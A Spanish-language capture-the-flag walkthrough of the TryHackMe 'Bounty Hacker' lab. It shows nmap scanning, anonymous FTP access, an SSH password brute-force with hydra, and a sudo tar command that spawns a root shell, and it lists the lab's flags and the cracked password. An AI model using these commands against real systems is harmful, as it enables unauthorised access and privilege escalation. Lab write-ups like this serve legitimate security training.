# Bounty Hacker

### tags: `Try Hack Me` `Linux` `FTP` `SSH` `sudo` `tar`

## **FLAGS:**

* User Flag: THM{CR1M3\_SyNd1C4T3}
* Root Flag: THM{80UN7Y\_h4cK3r}

## **USERS:**

* lin \(pwd: RedDr4gonSynd1cat3\)

## **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`

   ![](https://i.imgur.com/HGOhmwv.png)

2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

   * Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

     ```text
       -sS        Realizar un TCP SYN port scan
       --min-rate    Emitir al menos 5000 paquetes por segundo
       -Pn        No realizar Host Discovery
     ```

     * Va más rápido y encuentra los puertos 21 \(FTP\), 22 \(SSH\) y 80 \(HTTP\)

       ![](https://i.imgur.com/8u7YBMS.png)
3. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p21,22,80 IP`

   ![](https://i.imgur.com/YDTOBn4.png)

4. Vemos que tiene FTP con acceso anónimo. Nos conectamos para ver que hay:

   ![](https://i.imgur.com/IgLK8ZQ.png)

   * Vemos 2 ficheros. Los descargamos con `mget FILE1 FILE2`

     ![](https://i.imgur.com/M9iAWLE.png)

   * Es interesante. Parece que podemos tener un potencial usuario **lin** y una lista de posibles contraseñas.

5. Vamos a hacer fuerza bruta con hydra sobre el servicio SSH, indicando el usuario y la lista de posibles passwords.

   `hydra -l lin -P DICT ssh://IP -t 16`

   ```text
    -l            Usuario
    -P            Diccionario de passwords (locks.txt)
    ssh://IP      Servidor al que atacar
    -t            Número de hilos
   ```

   ![](https://i.imgur.com/gvCMXVO.png)

   Tenemos un usuario: **lin** Tenemos la password de lin: **RedDr4gonSynd1cat3**

## **GET A SHELL**

Nos conectamos por SSH con el usuario lin y la password encontrada. Tenemos una shell como el usuario **lin**.

![](https://i.imgur.com/JU7t534.png)

## **USER FLAG**

En su directorio Desktop vemos la flag user.txt:

![](https://i.imgur.com/HFEzGUy.png)

Tenemos la user flag: **THM{CR1M3\_SyNd1C4T3}**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)

1. En primer lugar, intentamos ver los privilegios de sudo del usuario lin.

   ![](https://i.imgur.com/mSdi8n3.png)

2. Vemos que puede ejecutar el comando tar. En esta [guía](https://gtfobins.github.io/) vemos como explotar esta vulnerabilidad.

   ![](https://i.imgur.com/Ty76kvx.png)

3. Ejecutamos lo siguiente:

   `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

   ![](https://i.imgur.com/hKqWQwL.png)

4. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

   Tenemos la root flag: **THM{80UN7Y\_h4cK3r}**

